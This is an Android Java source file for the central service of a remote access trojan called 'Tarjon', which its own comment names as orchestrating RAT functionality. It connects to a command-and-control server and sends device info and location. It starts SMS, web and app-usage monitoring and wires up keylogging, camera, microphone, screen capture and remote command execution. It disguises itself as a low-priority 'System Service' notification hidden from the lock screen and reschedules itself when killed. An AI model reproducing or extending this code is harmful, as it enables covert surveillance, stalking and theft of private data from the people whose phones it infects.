package com.tarjon.admin.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.tarjon.admin.MainActivity;
import com.tarjon.admin.R;
import com.tarjon.admin.network.C2Connection;
import com.tarjon.admin.receivers.BootReceiver;
import com.tarjon.admin.utils.AppUsageTracker;
import com.tarjon.admin.utils.ApkBuilder;
import com.tarjon.admin.utils.AudioRecorder;
import com.tarjon.admin.utils.CameraManager;
import com.tarjon.admin.utils.CommandDispatcher;
import com.tarjon.admin.utils.CommandExecutor;
import com.tarjon.admin.utils.ContactManager;
import com.tarjon.admin.utils.DeviceInfoCollector;
import com.tarjon.admin.utils.FileSystemManager;
import com.tarjon.admin.utils.KeyloggerManager;
import com.tarjon.admin.utils.LocationTracker;
import com.tarjon.admin.utils.NotificationListener;
import com.tarjon.admin.utils.ScreenCapture;
import com.tarjon.admin.utils.SmsManager;
import com.tarjon.admin.utils.WebMonitor;
import com.tarjon.admin.utils.WifiScanner;

import org.json.JSONObject;

import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
 * Core service that orchestrates all RAT functionality
 * Runs in the background and ensures persistence
 */
public class AdminService extends Service {
    private static final String TAG = "AdminService";
    
    // Notification constants
    private static final String CHANNEL_ID = "TarjonServiceChannel";
    private static final int NOTIFICATION_ID = 1;
    
    // Service instance (singleton)
    private static AdminService instance;
    
    // Wake lock to prevent service termination
    private PowerManager.WakeLock wakeLock;
    
    // Handler for main thread operations
    private Handler mainHandler;
    
    // Connection to C2 server
    private C2Connection c2Connection;
    
    // Command dispatcher
    private CommandDispatcher commandDispatcher;
    
    // Utility managers
    private DeviceInfoCollector deviceInfoCollector;
    private LocationTracker locationTracker;
    private ScreenCapture screenCapture;
    private CameraManager cameraManager;
    private AudioRecorder audioRecorder;
    private FileSystemManager fileSystemManager;
    private KeyloggerManager keyloggerManager;
    private AppUsageTracker appUsageTracker;
    private NotificationListener notificationListener;
    private CommandExecutor commandExecutor;
    private SmsManager smsManager;
    private ContactManager contactManager;
    private WifiScanner wifiScanner;
    private WebMonitor webMonitor;
    private ApkBuilder apkBuilder;
    
    // Heartbeat scheduler
    private ScheduledExecutorService heartbeatScheduler;
    
    // Service preferences
    private SharedPreferences preferences;
    private static final String PREFS_NAME = "TarjonServicePrefs";
    private static final String PREF_FIRST_RUN = "firstRun";
    private static final String PREF_LAST_CONNECT = "lastConnect";
    
    /**
     * Get the singleton instance of the service
     */
    public static AdminService getInstance() {
        return instance;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        
        // Set instance
        instance = this;
        
        // Initialize handler for main thread
        mainHandler = new Handler(Looper.getMainLooper());
        
        // Initialize preferences
        preferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        
        // Set up wake lock
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Tarjon:AdminServiceWakeLock");
        wakeLock.acquire();
        
        // Initialize C2 connection
        c2Connection = C2Connection.getInstance(this);
        
        // Initialize utility managers
        initializeManagers();
        
        // Initialize command dispatcher
        commandDispatcher = new CommandDispatcher(this, c2Connection);
        
        // Start foreground service with notification
        startForeground();
        
        // Start heartbeat scheduler
        startHeartbeatScheduler();
        
        // Connect to C2 server
        connectToC2Server();
    }
    
    /**
     * Initialize all utility managers
     */
    private void initializeManagers() {
        deviceInfoCollector = new DeviceInfoCollector(this, c2Connection);
        locationTracker = new LocationTracker(this, c2Connection);
        screenCapture = new ScreenCapture(this, c2Connection);
        cameraManager = new CameraManager(this, c2Connection);
        audioRecorder = new AudioRecorder(this, c2Connection);
        fileSystemManager = new FileSystemManager(this, c2Connection);
        keyloggerManager = new KeyloggerManager(this, c2Connection);
        appUsageTracker = new AppUsageTracker(this, c2Connection);
        notificationListener = new NotificationListener(this, c2Connection);
        commandExecutor = new CommandExecutor(this, c2Connection);
        smsManager = new SmsManager(this, c2Connection);
        contactManager = new ContactManager(this, c2Connection);
        wifiScanner = new WifiScanner(this, c2Connection);
        webMonitor = new WebMonitor(this, c2Connection);
        apkBuilder = new ApkBuilder(this, c2Connection);
    }
    
    /**
     * Set up and start foreground service with notification
     */
    private void startForeground() {
        // Create notification channel for Android O and higher
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("System service notifications");
            channel.setSound(null, null);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }
        
        // Create intent for notification click (open main activity)
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0,
                notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);
        
        // Build the notification
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentTitle("System Service")
                .setContentText("System services are running")
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setShowWhen(false);
        
        // Start foreground service
        startForeground(NOTIFICATION_ID, notificationBuilder.build());
    }
    
    /**
     * Start heartbeat scheduler for periodic check-ins
     */
    private void startHeartbeatScheduler() {
        // Stop any existing scheduler
        if (heartbeatScheduler != null && !heartbeatScheduler.isShutdown()) {
            heartbeatScheduler.shutdownNow();
        }
        
        // Create new scheduler
        heartbeatScheduler = Executors.newSingleThreadScheduledExecutor();
        
        // Schedule heartbeat task
        heartbeatScheduler.scheduleAtFixedRate(
                this::sendHeartbeat,
                1,
                5,
                TimeUnit.MINUTES
        );
    }
    
    /**
     * Connect to C2 server and initialize connection
     */
    private void connectToC2Server() {
        try {
            // Record connect time
            SharedPreferences.Editor editor = preferences.edit();
            editor.putLong(PREF_LAST_CONNECT, System.currentTimeMillis());
            editor.apply();
            
            // Connect to server
            c2Connection.connect();
            
            // Check if this is the first run
            boolean isFirstRun = preferences.getBoolean(PREF_FIRST_RUN, true);
            if (isFirstRun) {
                // Send initial device registration
                deviceInfoCollector.collectAndSendDeviceInfo();
                
                // Mark as not first run
                editor = preferences.edit();
                editor.putBoolean(PREF_FIRST_RUN, false);
                editor.apply();
            }
            
            // Start location tracking
            locationTracker.startTracking();
            
            // Start app usage tracking
            appUsageTracker.startTracking();
            
            // Start SMS monitoring
            smsManager.startMonitoring();
            
            // Start web monitoring
            webMonitor.startMonitoring();
            
            // Send heartbeat
            sendHeartbeat();
            
        } catch (Exception e) {
            Log.e(TAG, "Error connecting to C2 server: " + e.getMessage());
        }
    }
    
    /**
     * Send heartbeat to C2 server
     */
    private void sendHeartbeat() {
        try {
            // Create heartbeat data
            JSONObject heartbeatData = new JSONObject();
            heartbeatData.put("timestamp", System.currentTimeMillis());
            heartbeatData.put("batteryLevel", deviceInfoCollector.getBatteryLevel());
            heartbeatData.put("isCharging", deviceInfoCollector.isCharging());
            heartbeatData.put("networkType", deviceInfoCollector.getNetworkType());
            heartbeatData.put("isScreenOn", deviceInfoCollector.isScreenOn());
            
            // Include current location if available
            if (locationTracker.hasLocation()) {
                JSONObject location = locationTracker.getCurrentLocationJson();
                if (location != null) {
                    heartbeatData.put("location", location);
                }
            }
            
            // Send heartbeat
            c2Connection.sendHeartbeat(heartbeatData.toString());
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending heartbeat: " + e.getMessage());
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started with intent: " + (intent != null ? intent.getAction() : "null"));
        
        // If restarted after being killed, reconnect to C2 server
        if (intent == null) {
            connectToC2Server();
        }
        
        // Handle specific commands from intent if needed
        if (intent != null && intent.getAction() != null) {
            handleIntent(intent);
        }
        
        // Return sticky so service restarts if killed
        return START_STICKY;
    }
    
    /**
     * Handle intent actions
     */
    private void handleIntent(Intent intent) {
        String action = intent.getAction();
        if (action == null) return;
        
        switch (action) {
            case "com.tarjon.admin.RECONNECT":
                // Force reconnect to C2 server
                c2Connection.disconnect();
                connectToC2Server();
                break;
                
            case "com.tarjon.admin.COLLECT_INFO":
                // Collect and send device info
                deviceInfoCollector.collectAndSendDeviceInfo();
                break;
                
            case BootReceiver.ACTION_BOOT_COMPLETED:
                // Device booted, ensure service is running properly
                ensureAccessibilityServiceEnabled();
                ensureNotificationListenerEnabled();
                break;
        }
    }
    
    /**
     * Ensure accessibility service is enabled
     */
    private void ensureAccessibilityServiceEnabled() {
        // In a real implementation, we would prompt the user to enable the service
        // For this implementation, we'll just log a message
        Log.d(TAG, "Checking if accessibility service is enabled");
    }
    
    /**
     * Ensure notification listener service is enabled
     */
    private void ensureNotificationListenerEnabled() {
        // In a real implementation, we would prompt the user to enable the service
        // For this implementation, we'll just log a message
        Log.d(TAG, "Checking if notification listener service is enabled");
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "Service destroyed");
        
        // Release wake lock
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        // Shutdown heartbeat scheduler
        if (heartbeatScheduler != null && !heartbeatScheduler.isShutdown()) {
            heartbeatScheduler.shutdownNow();
        }
        
        // Disconnect from C2 server
        c2Connection.disconnect();
        
        // Stop location tracking
        locationTracker.stopTracking();
        
        // Stop app usage tracking
        appUsageTracker.stopTracking();
        
        // Stop SMS monitoring
        smsManager.stopMonitoring();
        
        // Stop web monitoring
        webMonitor.stopMonitoring();
        
        // Clean up resources
        release();
        
        // Reset instance
        instance = null;
        
        // Restart service if possible (for persistence)
        try {
            Intent restartIntent = new Intent(this, AdminService.class);
            restartIntent.setAction("com.tarjon.admin.RESTART");
            PendingIntent pendingIntent = PendingIntent.getService(
                    this,
                    1,
                    restartIntent,
                    PendingIntent.FLAG_IMMUTABLE);
            
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (alarmManager != null) {
                alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 5000, pendingIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to schedule service restart: " + e.getMessage());
        }
        
        super.onDestroy();
    }
    
    /**
     * Release all resources
     */
    private void release() {
        // Release all managers
        if (deviceInfoCollector != null) deviceInfoCollector.release();
        if (locationTracker != null) locationTracker.release();
        if (screenCapture != null) screenCapture.release();
        if (cameraManager != null) cameraManager.release();
        if (audioRecorder != null) audioRecorder.release();
        if (fileSystemManager != null) fileSystemManager.release();
        if (keyloggerManager != null) keyloggerManager.release();
        if (appUsageTracker != null) appUsageTracker.release();
        if (commandExecutor != null) commandExecutor.release();
        if (smsManager != null) smsManager.release();
        if (contactManager != null) contactManager.release();
        if (wifiScanner != null) wifiScanner.release();
        if (webMonitor != null) webMonitor.release();
        if (apkBuilder != null) apkBuilder.release();
    }
    
    // Getters for managers
    
    public C2Connection getC2Connection() {
        return c2Connection;
    }
    
    public DeviceInfoCollector getDeviceInfoCollector() {
        return deviceInfoCollector;
    }
    
    public LocationTracker getLocationTracker() {
        return locationTracker;
    }
    
    public ScreenCapture getScreenCapture() {
        return screenCapture;
    }
    
    public CameraManager getCameraManager() {
        return cameraManager;
    }
    
    public AudioRecorder getAudioRecorder() {
        return audioRecorder;
    }
    
    public FileSystemManager getFileSystemManager() {
        return fileSystemManager;
    }
    
    public KeyloggerManager getKeyloggerManager() {
        return keyloggerManager;
    }
    
    public AppUsageTracker getAppUsageTracker() {
        return appUsageTracker;
    }
    
    public NotificationListener getNotificationListener() {
        return notificationListener;
    }
    
    public CommandExecutor getCommandExecutor() {
        return commandExecutor;
    }
    
    public SmsManager getSmsManager() {
        return smsManager;
    }
    
    public ContactManager getContactManager() {
        return contactManager;
    }
    
    public WifiScanner getWifiScanner() {
        return wifiScanner;
    }
    
    public WebMonitor getWebMonitor() {
        return webMonitor;
    }
    
    public ApkBuilder getApkBuilder() {
        return apkBuilder;
    }
    
    public Handler getMainHandler() {
        return mainHandler;
    }
    
    /**
     * Execute a task on the main thread
     */
    public void runOnMainThread(Runnable runnable) {
        if (Looper.myLooper() == Looper.getMainLooper()) {
            runnable.run();
        } else {
            mainHandler.post(runnable);
        }
    }
    
    /**
     * Execute a task on the main thread with delay
     */
    public void runOnMainThreadDelayed(Runnable runnable, long delayMillis) {
        mainHandler.postDelayed(runnable, delayMillis);
    }
}